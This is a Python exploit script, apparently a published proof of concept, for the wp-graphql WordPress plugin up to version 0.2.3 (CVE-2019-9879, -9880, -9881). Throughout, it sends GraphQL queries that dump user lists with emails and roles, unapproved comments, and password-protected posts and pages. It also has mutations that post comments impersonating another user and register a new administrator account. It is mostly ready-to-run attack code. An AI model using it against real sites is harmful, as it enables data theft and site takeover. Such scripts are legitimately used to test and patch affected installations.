#
# Author: Simone Quatrini of Pen Test Partners
# CVEs: 2019-9879, 2019-9880, 2019-9881

import argparse
import requests
import base64
import json
import sys

parser = argparse.ArgumentParser(description="wp-graphql <= 0.2.3 multi-exploit")


parser.add_argument(&#039;--post-comment&#039;, nargs=3, action=&#039;store&#039;, metavar=(&#039;postid&#039;,&#039;userid&#039;,&#039;commenttext&#039;), dest=&#039;comment&#039;, required=False, help="Post comment impersonating a specific user. e.g.: --post-comment 2 1 Test")

parser.add_argument(&#039;--register-admin&#039;, nargs=3, action=&#039;store&#039;, metavar=(&#039;email&#039;,&#039;password&#039;,&#039;username&#039;), dest=&#039;register&#039;, required=False, help="Register a new admin user. e.g.: --register-admin test@example.com MySecretP@ssword hax0r")

parser.add_argument(&#039;--verbose&#039;, &#039;-v&#039;, action=&#039;store_true&#039;, required=False, help="Shows the full response")

args = parser.parse_args()


def show_plugins(url, headers, verbose):
	payload = {"query":"{plugins{edges{node{name,description,version}}}}"}
	response = requests.post(url, data=json.dumps(payload), headers=headers)
	if response.status_code == 200 and &#039;node&#039; in response.text:
		print "[+] Installed plugins:"
		parsed = json.loads(response.text)
		for i in parsed[&#039;data&#039;][&#039;plugins&#039;][&#039;edges&#039;]:
		    print i[&#039;node&#039;][&#039;name&#039;]+" "+i[&#039;node&#039;][&#039;version&#039;]
	else:
		print "\n[-] Error code fetching plugins: ", response.status_code
	
	if verbose:
		print(response.text)

def show_themes(url, headers, verbose):
	payload = {"query":"{themes{edges{node{name,description,version}}}}"}
	response = requests.post(url, data=json.dumps(payload), headers=headers)
	if response.status_code == 200 and &#039;node&#039; in response.text:
		print "\n[+] Installed themes:"
		parsed = json.loads(response.text)
		for i in parsed[&#039;data&#039;][&#039;themes&#039;][&#039;edges&#039;]:
		    print i[&#039;node&#039;][&#039;name&#039;]+" "+str(i[&#039;node&#039;][&#039;version&#039;])
	else:
		print "\n[-] Error code fetching themes: ", response.status_code
	
	if verbose:
		print(response.text)

def show_medias(url, headers, verbose):
	payload = {"query":"{mediaItems{edges{node{id,mediaDetails{file,sizes{file,height,mimeType,name,sourceUrl,width}},uri}}}}"}
	response = requests.post(url, data=json.dumps(payload), headers=headers)
	if response.status_code == 200 and &#039;node&#039; in response.text:
		print "\n[+] Media items:"
		parsed = json.loads(response.text)
		for i in parsed[&#039;data&#039;][&#039;mediaItems&#039;][&#039;edges&#039;]:
		    print "/wp-content/uploads/"+i[&#039;node&#039;][&#039;mediaDetails&#039;][&#039;file&#039;]
	else:
		print "\n[-] Error code fetching media items: ", response.status_code
	
	if verbose:
		print(response.text)

def show_users(url, headers, verbose):
	payload = {"query":"{users{edges{node{firstName,lastName,nickname,roles,email,userId,username}}}}"}
	response = requests.post(url, data=json.dumps(payload), headers=headers)
	if response.status_code == 200 and &#039;node&#039; in response.text:
		print "\n[+] User list:"
		parsed = json.loads(response.text)
		for i in parsed[&#039;data&#039;][&#039;users&#039;][&#039;edges&#039;]:
		    print "ID: "+str(i[&#039;node&#039;][&#039;userId&#039;])+" - Username: "+i[&#039;node&#039;][&#039;username&#039;]+" - Email: "+i[&#039;node&#039;][&#039;email&#039;]+" - Role: "+i[&#039;node&#039;][&#039;roles&#039;][0]
	else:
		print "\n[-] Error code fetching user list: ", response.status_code
	
	if verbose:
		print(response.text)

def show_comments(url, headers, verbose):
	payload = {"query":"{comments(where:{includeUnapproved:[]}){edges{node{id,commentId,approved,content(format:RAW)}}}}"}
	response = requests.post(url, data=json.dumps(payload), headers=headers)
	if response.status_code == 200 and &#039;node&#039; in response.text:
		print "\n[+] Comments list:"
		parsed = json.loads(response.text)
		for i in parsed[&#039;data&#039;][&#039;comments&#039;][&#039;edges&#039;]:
		    print "ID: "+str(i[&#039;node&#039;][&#039;commentId&#039;])+" - Approved: "+str(i[&#039;node&#039;][&#039;approved&#039;])+" - Text: "+str(i[&#039;node&#039;][&#039;content&#039;])
	else:
		print "\n[-] Error code fetching comments list: ", response.status_code
	
	if verbose:
		print(response.text)

def show_password_protected(url, headers, verbose):
	payload = {"query":"{posts(where:{hasPassword:true}){edges{node{title,id,content(format:RAW)}}}}"}
	response = requests.post(url, data=json.dumps(payload), headers=headers)
	if response.status_code == 200 and &#039;node&#039; in response.text:
		print "\n[+] Found the following password protected post(s):"
		parsed = json.loads(response.text)
		for i in parsed[&#039;data&#039;][&#039;posts&#039;][&#039;edges&#039;]:
		    print "ID: "+base64.b64decode(str(i[&#039;node&#039;][&#039;id&#039;]))+" - Title: "+str(i[&#039;node&#039;][&#039;title&#039;])+" - Content: "+str(i[&#039;node&#039;][&#039;content&#039;])
	else:
		print "\n[-] No password protected post found"

	if verbose:
		print(response.text)

	payload = {"query":"{pages(where:{hasPassword:true}){edges{node{id,link,title,uri,content(format:RAW)}}}}"}
	response = requests.post(url, data=json.dumps(payload), headers=headers)
	if response.status_code == 200 and &#039;node&#039; in response.text:
		print "\n[+] Found the following password protected page(s):"
		parsed = json.loads(response.text)
		for i in parsed[&#039;data&#039;][&#039;pages&#039;][&#039;edges&#039;]:
		    print "ID: "+base64.b64decode(str(i[&#039;node&#039;][&#039;id&#039;]))+" - Title: "+str(i[&#039;node&#039;][&#039;title&#039;])+" - Content: "+str(i[&#039;node&#039;][&#039;content&#039;])
	else:
		print "\n[-] No password protected page found"

	if verbose:
		print(response.text)


def post_comment(url, headers, postID, userID, comment, verbose):
	payload = {"query":"mutation{createComment(input:{postId:"+postID+",userId:"+userID+",content:\""+comment+"\",clientMutationId:\"UWHATM8\",}){clientMutationId}}"}
	response = requests.post(url, data=json.dumps(payload), headers=headers)
	if response.status_code == 200 and &#039;UWHATM8&#039; in response.text:
		print "[+] Comment posted on article ID "+postID+""
	else:
		print "\n[-] Error posting the comment. Check that postID and userID are correct"

	if verbose:
		print(response.text)

def register_admin(url, headers, email, password, username, verbose):
	payload = {"query":"mutation{registerUser(input:{clientMutationId:\"UWHATM8\",email:\""+email+"\",password:\""+password+"\",username:\""+username+"\",roles:[\"administrator\"]}){clientMutationId}}"}
	response = requests.post(url, data=json.dumps(payload), headers=headers)
	if response.status_code == 200 and &#039;UWHATM8&#039; in response.text:
		print "[+] New admin created. Login with "+username+":"+password
	else:
		print "\n[-] Registrations are closed, can&#039;t proceed."

	if verbose:
		print(response.text)

def check_endpoint(url, headers):
	payload = {&#039;&#039;:&#039;&#039;}
	response = requests.post(url, data=json.dumps(payload), headers=headers)
	if response.status_code == 200:
		print "[+] Endpoint is reachable\n"
	else:
		print "\n[-] Endpoint response code: ", response.status_code
		sys.exit()
		


url = args.url
headers = {&#039;Content-type&#039;: &#039;application/json&#039;, &#039;User-agent&#039;:&#039;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36&#039;}
verbose = args.verbose


# Only in case &#039;--post-comment&#039; is passed
if args.comment:
	postID, userID, comment = args.comment
	check_endpoint(url, headers)
	post_comment(url, headers, postID, userID, comment, verbose)
	sys.exit()

# Only in case &#039;--register-admin&#039; is passed
if args.register:
	email, password, username = args.register
	check_endpoint(url, headers)
	register_admin(url, headers, email, password, username, verbose)
	sys.exit()

# Default actions if only &#039;--url&#039; is passed
show_plugins(url, headers, verbose)
show_themes(url, headers, verbose)
show_medias(url, headers, verbose)
show_users(url, headers, verbose)
show_comments(url, headers, verbose)
show_password_protected(url, headers, verbose)

